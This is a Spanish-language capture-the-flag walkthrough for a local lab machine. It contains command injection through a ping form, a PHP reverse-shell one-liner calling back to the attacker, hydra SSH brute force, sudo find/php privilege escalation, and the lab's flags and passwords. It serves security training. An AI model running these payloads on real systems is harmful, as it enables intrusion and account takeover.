---
icon: flag
---

# CTF HackMeDaddy Hard

URL Download CTF = [https://drive.google.com/file/d/1VCC-mMIGoh-JUgcbCnHdKTqQQXq-yxf5/view?usp=sharing](https://drive.google.com/file/d/1VCC-mMIGoh-JUgcbCnHdKTqQQXq-yxf5/view?usp=sharing)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip hackmedaddy.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_mount.sh hackmedaddy.tar
```

Info:

```
___________________¶¶
____________________¶¶__¶_5¶¶
____________5¶5__¶5__¶¶_5¶__¶¶¶5
__________5¶¶¶__¶¶5¶¶¶¶¶5¶¶__5¶¶¶5
_________¶¶¶¶__¶5¶¶¶¶¶¶¶¶¶¶¶__5¶¶¶¶5
_______5¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶_5¶¶__5¶¶¶¶¶5
______¶¶¶¶¶5_¶¶¶¶¶¶¶¶¶¶¶¶¶5¶¶¶__¶¶¶¶5¶5
_____¶¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶¶¶¶5
____¶¶¶¶¶¶¶_¶¶¶5¶¶¶¶5_¶¶¶¶¶5_5¶_¶¶¶¶¶¶¶¶5
___¶¶¶¶¶¶¶¶__5¶¶¶¶¶¶5___5¶¶¶¶__5¶¶¶¶¶¶¶¶¶5
__¶¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶5__5¶¶5_5¶¶¶¶¶¶¶¶¶¶¶
_5¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶¶¶¶¶¶¶¶5
_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶
5¶¶¶¶¶¶¶¶¶¶¶¶5___5¶¶¶¶¶¶¶5__¶¶¶¶5_¶¶¶5_¶¶¶¶
¶¶¶¶¶¶¶¶_¶¶5_5¶5__¶¶¶¶¶¶¶¶¶5_5¶¶¶_5¶¶¶_5¶¶¶5
¶5¶¶¶¶¶5_¶¶_5¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶5_5¶¶_5¶¶¶_¶¶¶5
¶¶¶¶_¶¶__¶__¶¶¶¶¶¶5_5¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶¶_5¶¶¶
¶¶¶5_5¶______5¶¶5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶5_¶5¶
5¶¶____5¶¶¶¶5_____5¶¶¶¶¶¶¶5_¶¶¶¶¶5_¶__¶¶_5¶¶
_¶¶__5¶¶¶¶¶¶¶¶¶¶5____5¶¶¶¶¶¶_¶¶¶¶¶_____¶5_¶¶
_¶¶___5¶¶¶¶¶¶¶¶¶__________5¶5_¶¶¶¶¶____¶¶_¶¶
_¶¶_______5¶¶¶¶¶¶5____________¶¶¶¶¶_____¶_¶¶
_5¶5________5¶¶_¶¶¶¶5________5¶¶¶¶¶_______¶¶
__¶¶__________¶___¶¶¶¶¶5___5¶¶¶¶¶¶5_______¶5
__¶¶____________5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶________¶
___¶________________5¶¶¶¶¶¶¶¶5_¶¶
___¶__________5¶¶¶¶¶¶¶¶5¶¶¶5__5¶5
_____________________5¶¶¶5____¶5

                                           
 ##   ##    ##       ####   ###  ##  #######  ######   ####       ##     ######    #####  
 ##   ##   ####     ##  ##   ##  ##   ##   #   ##  ##   ##       ####     ##  ##  ##   ## 
 ##   ##  ##  ##   ##        ## ##    ## #     ##  ##   ##      ##  ##    ##  ##  #       
 #######  ##  ##   ##        ####     ####     #####    ##      ##  ##    #####    #####  
 ##   ##  ######   ##        ## ##    ## #     ## ##    ##   #  ######    ##  ##       ## 
 ##   ##  ##  ##    ##  ##   ##  ##   ##   #   ##  ##   ##  ##  ##  ##    ##  ##  ##   ## 
 ##   ##  ##  ##     ####   ###  ##  #######  #### ##  #######  ##  ##   ######    #####  
                                         

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.19.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-13 10:44 EDT
Nmap scan report for 172.19.0.2
Host is up (0.000072s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 05:48:9d:f6:29:e1:dd:c4:f6:18:87:ff:13:15:5a:80 (ECDSA)
|_  256 0a:3d:0d:c3:fe:4e:57:8a:de:1f:5f:3c:8e:92:e9:5b (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: HackMeDaddy - Hacking \xC3\x89tico
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-robots.txt: 3 disallowed entries 
|_/FLAG.txt /joomla/* /secret/
MAC Address: 02:42:AC:13:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.74 seconds
```

Vemos que hay un puerto `80` en el que aparentemente no hay mucho por hacer, por lo que fuzzearemos de forma mas profunda.

### Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.19.0.2/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htaccess.html       (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htpasswd.html       (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/flag.txt             (Status: 200) [Size: 455]
/info.txt             (Status: 200) [Size: 123]
/index.html           (Status: 200) [Size: 7036]
/robots.txt           (Status: 200) [Size: 691]
/robots.txt           (Status: 200) [Size: 691]
/server-status        (Status: 403) [Size: 275]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos varios archivos interesantes, si leemos el `/info.txt` veremos lo siguiente.

```
URL = http://<IP>/info.txt

#Contenido

Look, I told Eliot to remove those words from the README.txt because it could be a big security flaw in our HTML folder.
```

Nos da una pista de que en los comandos que se van pasando cuando tu le das al boton de `Ejecutar Comando` en la pagina principal, aparece uno llamado `README.txt` que contiene palabras de las cuales 1 sirve como directorio para la URL, por lo que cogeremos esa lista de palabras y le tiraremos un `gobuster`.

> fuzz.txt

```
d05notfound
exploit
payload
shell
bruteforce
vulnerability
cipher
zero-day
phishing
root
port_scan
firewall
backdoor
```

```shell
gobuster dir -u http://<IP>/ -w fuzz.txt -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.19.0.2/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                fuzz.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/d05notfound          (Status: 200) [Size: 960]
Progress: 52 / 56 (92.86%)
===============================================================
Finished
===============================================================
```

Vemos que hay coincidencia con una y si lo metemos en la URL de la siguiente forma.

```
URL = http://<IP>/d05notfound/
```

Veremos un archivo llamado `d05notfound.php` por lo que nos meteremos en el y veremos otra pagina en la que hay mucha informacion, pero si bajamos a bajo del todo, veremos algo interesante, donde pone `Introduzca la dirección IP`, si ponemos hay nuestra IP o la que sea va a realizar un ping, pero no se va a ver en la pagina tendremos que darle a inspeccionar codigo y veremos los resultados del ping.

```
PING 192.168.5.145 (192.168.5.145) 56(84) bytes of data.
64 bytes from 192.168.5.145: icmp_seq=1 ttl=64 time=0.057 ms
64 bytes from 192.168.5.145: icmp_seq=2 ttl=64 time=0.050 ms
64 bytes from 192.168.5.145: icmp_seq=3 ttl=64 time=0.042 ms
64 bytes from 192.168.5.145: icmp_seq=4 ttl=64 time=0.044 ms

--- 192.168.5.145 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3078ms
rtt min/avg/max/mdev = 0.042/0.048/0.057/0.005 ms
```

Pero mas abajo poner `resultados de comando:` por lo que da pie a que puedes concatenar comandos, probaremos a introducir el siguiente comando.

```shell
<IP> | ls -la
```

Lo ejecutamos y visualizamos de nuevo el codigo.

```
PING 192.168.5.145 (192.168.5.145) 56(84) bytes of data.
64 bytes from 192.168.5.145: icmp_seq=1 ttl=64 time=0.060 ms
64 bytes from 192.168.5.145: icmp_seq=2 ttl=64 time=0.247 ms
64 bytes from 192.168.5.145: icmp_seq=3 ttl=64 time=0.051 ms
64 bytes from 192.168.5.145: icmp_seq=4 ttl=64 time=0.050 ms

--- 192.168.5.145 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3048ms
rtt min/avg/max/mdev = 0.050/0.102/0.247/0.083 ms

</pre><h2>Resultado del Comando:</h2><pre>total 20
drwxr-xr-x 2 root root 4096 Aug 13 14:42 .
drwxr-xr-x 3 root root 4096 Aug 13 14:52 ..
-rw-r--r-- 1 root root 8300 Aug 13 14:40 d05notfound.php
```

Por lo que vemos funciona, ahora intentaremos hacernos una `Reverse Shell` hacia la maquina con esta vulnerabildiad de la siguiente forma.

## Reverse Shell

Pero antes estaremos a la escucha para capturar la peticion.

```shell
nc -lvnp <PORT>
```

Y ahora enviaremos el siguiente comando adaptandolo a nuestras necesidades.

```shell
<IP> | php -r '$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

Una vez enviado el comando, si nos vamos a donde teniamos la escucha veremos que nos ha creado una shell y si hacemos `whoami` veremos que somos `www-data`.

```
connect to [192.168.5.145] from (UNKNOWN) [172.19.0.2] 46450
whoami
www-data
```

Por lo que sanitizaremos la shell.

## Sanitizar la shell

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user e1i0t

Nos iremos a la carpeta del usuario `e1i0t` y veremos un archivo llamado `nota.txt`, si la leemos veremos lo siguiente.

```
Reminder:

Delete my passwords from the agenda, I don't want to screw up with the boss again.

By e1i0t
```

Nos da una pista de que tiene una agenda con las contarseñas y seguramente una de ellas sea la del usuario `e1i0t`, si nos vamos a la carpeta `documents/` veremos 2 archivos y el que nos interesa es el llamado `agenda.txt`, por lo que lo utilizaremos como diccionario de palabras para saber la contarseña de `e1i0t`.

> agenda.txt

```
mejor
eliotel
telmejor
mejorel
mejortel
eliot
elitel
tel
mejor
telmejor
eliotel
elimejor
mejorelito
eliotmejor
elitelmejor
mejortel
telmelo
eliotmel
melotimejor
elimejortel
elitelito
elioteltimejor
mejorl
eliotelmel
mejortelito
elimejorl
telmejorl
eliotmel
meljor
mel
eliotelmeljor
mejorel
elimejor
telmejor
mejor
eliotmeljor
elitelmejor
telmel
mejoreliot
mejorl
mejorelito
eliotelmejor
meljor
elioteltel
mejortel
elitelmej
mejorel
eliotmeljor
telmejor
elitel
meljor
eliotmejor
melot
mejorl
telmejor
eliotmel
melotimejor
mejorl
eliotelmeljor
mejorelito
telmel
meljor
eliotmeljor
elimejor
mel
eliotelmel
mejortel
telmejor
eliotmeljor
mejorl
mel
eliotmeljor
melotimejor
elitel
mejor
telmel
meljor
eliotelmejor
mejorel
eliotmeljor
mel
telmejor
eliotmel
mejorl
mejortel
elimejor
eliotel
mejorelito
mel
eliotmeljor
mejor
melotimejor
elitelmejor
telmel
eliotmeljor
mejorel
eliotelmejor
mejorl
tel
eliotel
elitelmejor
meljor
mejor
melotimejor
eliotelmeljor
mejortel
```

### hydra

```shell
hydra -l e1i0t -P agenda.txt ssh://<IP> -t 64
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-13 11:05:48
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 107 login tries (l:1/p:107), ~2 tries per task
[DATA] attacking ssh://172.19.0.2:22/
[22][ssh] host: 172.19.0.2   login: e1i0t   password: eliotelmejor
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-08-13 11:05:51
```

Por lo que vemos nos saca las credenciales del usuario, asi que nos conectaremos por SSH mejor con dicho usuario.

## SSH

```shell
ssh e1i0t@<IP>
```

Metemos la contraseña `eliotelmejor` y ya estariamos dentro.

Leemos la flag del usuario.

> user.txt

```
d8109448593f23776d57bd512f322eff
```

## Escalate user an0n1mat0

Si hacemos `sudo -l` veremos lo siguiente.

```
Matching Defaults entries for e1i0t on 63ccda3ff003:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User e1i0t may run the following commands on 63ccda3ff003:
    (an0n1mat0 : an0n1mat0) NOPASSWD: /bin/find
```

Por lo que podemos ejecutar como el usuario `an0n1mat0` el binario `find`, con este binario hay una vulnerabilidad de permisos, si hacemos lo siguiente seremos el usuario `an0n1mat0`.

URL = https://gtfobins.github.io/gtfobins/find/#shell

```shell
sudo -u an0n1mat0 find . -exec /bin/sh \; -quit
```

Info:

```
$ whoami
an0n1mat0
```

Ejecutaremos `/bin/bash` para obtener una shell mejor y leeremos la flag de este usuario.

> user2.txt

```
11ab9a33cbd06b3325de00c7e32c0db8
```

## Escalate Privileges

Si hacemos `sudo -l` veremos que nos pedira contraseña, cosa que no tenemos, pero si investigamos mas, en la `home` del usuario `an0n1mat0` veremos que hay un archivo llamado `nota.txt` que contiene lo siguiente.

```
The boss told me that he will soon remove your privileges to be able to access your secret folder.
```

Nos da una pista de que hay una carpeta secreta por alguna parte del sistema, por lo que la buscaremos.

```shell
find / -name 'secret' 2>/dev/null
```

Info:

```
/secret
```

Vemos que en la propia raiz hay una carpeta llamada asi, si vamos dentro de ella veremos un archivo llamado `confidencial.txt` que contiene lo siguiente.

```
There is a super secret file that no one but the boss should read, because there are some user passwords.

You have to move the passwords_users.txt file to a more secure place.
```

Nos da otra pista de que en alguna parte hay un archivo llamado `passwords_users.txt` por lo que lo buscaremos.

```shell
find / -name 'passwords_users.txt' 2>/dev/null
```

Info:

```
/usr/local/bin/passwords_users.txt
```

Y veremos que esta en esa ubicacion, si leemos el archivo pone lo siguiente.

```
User passwords:

e1i0t:eliotelmejor
an0n1mat0:XXyanonymous
root:root

There are some outdated passwords, but I don't remember an0n1mat0's entire password, I know that where the two
```

Nos comenta que la contraseña de este usuario esta a medias, por lo que tendremos que generar un diccionario sustituyendo esas dos X's por letras del abecedario minusculas, lo haremos con la siguiente herramienta.

### mp64

```shell
mp64 '?l?lyanonymous' > passwords.txt
```

Con esto habremos generado un diccionario de palabras con todas las posibles combinaciones de ese nombre sustituyendo `?l?l` por letras del abecedario en minusculas.

### hydra

```shell
hydra -l an0n1mat0 -P passwords.txt ssh://<IP> -t 64
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-13 11:21:07
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 676 login tries (l:1/p:676), ~11 tries per task
[DATA] attacking ssh://172.19.0.2:22/
[STATUS] 419.00 tries/min, 419 tries in 00:01h, 290 to do in 00:01h, 31 active
[22][ssh] host: 172.19.0.2   login: an0n1mat0   password: soyanonymous
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 15 final worker threads did not complete until end.
[ERROR] 15 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-08-13 11:22:48
```

Por lo que vemos nos saca las credenciales, por lo que volveremos a la terminal y ahora si haremos `sudo -l`, meteremos la contraseña obtenida por `hydra` y veremos lo siguiente.

```
Matching Defaults entries for an0n1mat0 on 63ccda3ff003:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User an0n1mat0 may run the following commands on 63ccda3ff003:
    (ALL : ALL) /bin/php
```

Por lo que podremos ejecutar el binario de `php` como `root`, haremos lo siguiente.

URL = https://gtfobins.github.io/gtfobins/php/#sudo

```shell
CMD="/bin/bash"
sudo php -r "system('$CMD');"
```

Y con esto ya seriamos `root`, por lo que leeremos la flag.

```shell
cd /root
cat root.txt
```

> root.txt

```
2d264e1f92a8230d442750d69fba4cc5
```
